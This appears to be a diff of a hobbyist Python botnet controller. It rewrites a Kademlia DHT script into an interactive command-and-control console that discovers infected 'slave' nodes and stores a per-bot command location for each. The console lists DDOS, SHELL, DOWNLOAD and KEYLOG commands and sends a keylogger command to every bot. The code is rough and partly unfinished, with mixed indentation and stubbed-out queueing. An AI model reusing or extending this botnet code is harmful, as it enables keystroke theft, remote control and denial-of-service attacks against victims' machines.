@@ -1,56 +1,91 @@
-from twisted.internet import reactor, task, defer
-from twisted.python import log
 from kademlia.network import Server
+from twisted.protocols import basic
+from twisted.internet import reactor, task, defer, stdio
+from collections import deque
+from twisted.python import log
 import sys
 import hashlib
 
+class SlaveDriver(basic.LineReceiver):
+    from os import linesep as delimiter
+    import hashlib
+    
 
-if len(sys.argv) != 3:
-	print "Usage: python botnet.py <bootstrap ip> <bootstrap port>"
-	exit(0)
+    def __init__(self,kserver,key):
+    	self.state = "GETCMD"
+    	self.kserver = kserver
+        self.key = key
+        self.slaves = {}
+        self.slaveloop = task.LoopingCall(self.checknewslave)
+        self.slaveloop.start(5)
+        # self.kserver.listen(8468)
+        # self.kserver.bootstrap([("192.168.56.101", 8468)])
+    	self.queue = deque()
+    	#self.slaves = 
+    def checknewslave(self):
+        def addslave(val):
+            print "Val: ",val
+            if val:
+                if val not in self.slaves:
+                    print "New slave found"
+                    valhash = hashlib.sha1()
+                    valhash.update(str(val))
+                    newval = valhash.hexdigest()
+                    self.slaves[val]=newval
+                    #commands.updateslaves(slaves)
+                    self.kserver.set(self.slaves[val], str(val))
+                    for key, value in self.slaves.iteritems():
+                        print key, value
+        self.kserver.get(self.key).addCallback(addslave)
+    #this function will send command at the hash[bot's id]
+    
+    def parsecommands(self,cmd):
+        #def sendcommand(cmd,botid):
+        #self.server.set(self.slaves[botid],cmd)
+        if cmd == 'KEYLOG':
+            for key,val in self.slaves.iteritems():
+                output = 'Starting keylogger for bot {0}'.format(key)
+                self.transport.write(output)
+                self.kserver.set(val,cmd)
+    
+    def connectionMade(self):
+        self.transport.write('>>> ')
 
-def checknewslave(server,key):
-	server.get(key).addCallback(addslave,server,key)
+    def lineReceived(self, line):
+        #self.sendLine('Executing: ' + line)
+        self.handlecmd(line)
+        self.transport.write('>>> ')
+    # def updateslaves(self,slaves):
+    # 	self.slaves = slaves
 
-#want this to loop repeatedly looking for new slaves
-def addslave(val,server,key):
-	print "Val: ",val
-	if val:
-		if not val in slaves:
-			print "new slave found"
-			valhash = hashlib.sha1()
-			valhash.update(str(val))
-			newval = valhash.hexdigest()
-			slaves[val]=newval
-			server.set(slaves[val], str(val))
-	
-	#server.get(key).addCallback(addslave,server,key)
-
-def bootstrapDone(found, server):
-    if len(found) == 0:
-        print "Could not connect to the bootstrap server."
-        reactor.stop()
-        exit(0)
-    # key = hashlib.sha1()
-    # key.update('specialstring')
-    # keyhash = key.hexdigest()
-    # lc = task.LoopingCall(self,addslave,())
-    #server.get(keyhash).addCallback(addslave,server,keyhash)
-
-#list of known slaves, stores their command locations
-slaves = {} #using dictionary where key = nodeid, value = sha1 hash which is where to send commands
+    def finishcmd(self):
+    	self.queue.popleft()
+    def handlecmd(self, line):
+    	commands = ['LIST','DDOS','SHELL','DOWNLOAD','KEYLOG']
+    	#parse out actual command
+    	tmp = line.split(' ',1)
+    	cmd = tmp[0].upper()
+    	# args = None
+    	# if len(tmp) == 2:
+    	# 	args = tmp[1].upper()
+    	if cmd not in commands:
+    		self.transport.write('Invalid Command\n')
+    		self.transport.write('Valid commands are: LIST, DDOS [ip], SHELL [ip], DOWNLOAD [ip], KEYLOG [ip] \n')
+    		#self.transport.write('>>> ')
+    		self.state = "GETCMD"
+    	else:
+    		#self.slaves = slaves
+            self.parsecommands(cmd)
+    		# if args:
+    		# 	self.queue.append({cmd:args})
+    		# if not args:
+    		# 	self.queue.append({cmd:None})
 log.startLogging(sys.stdout)
-ip = str(sys.argv[1])
-port = int(sys.argv[2])
-
-server = Server()
-server.listen(port)
-server.bootstrap([(ip, port)]).addCallback(bootstrapDone, server)
-
+kserver = Server()
+kserver.listen(8468)
+kserver.bootstrap([("192.168.56.101", 8468)])
 key = hashlib.sha1()
 key.update('specialstring')
 keyhash = key.hexdigest()
-#want to check for new slave every second. Using a looping call instead of callback recursion fixed my infinite recusion issues
-slaveloop = task.LoopingCall(checknewslave,server,keyhash)
-slaveloop.start(1)
+stdio.StandardIO(SlaveDriver(kserver,keyhash))
 reactor.run()
